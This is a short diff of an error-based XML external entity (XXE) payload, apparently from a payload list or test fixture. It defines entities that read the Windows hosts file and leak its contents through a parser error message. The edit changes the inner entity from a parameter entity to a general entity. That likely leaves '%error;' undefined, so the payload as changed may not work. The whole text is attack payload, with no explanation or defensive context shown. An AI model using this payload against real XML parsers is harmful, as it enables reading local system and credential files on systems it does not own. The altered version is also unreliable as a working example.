@@ -1,4 +1,4 @@
 <!ENTITY % file SYSTEM "file://C:/Windows/System32/drivers/etc/hosts">
-<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+<!ENTITY % eval "<!ENTITY error SYSTEM 'file:///nonexistent/%file;'>">
 %eval;
 %error;
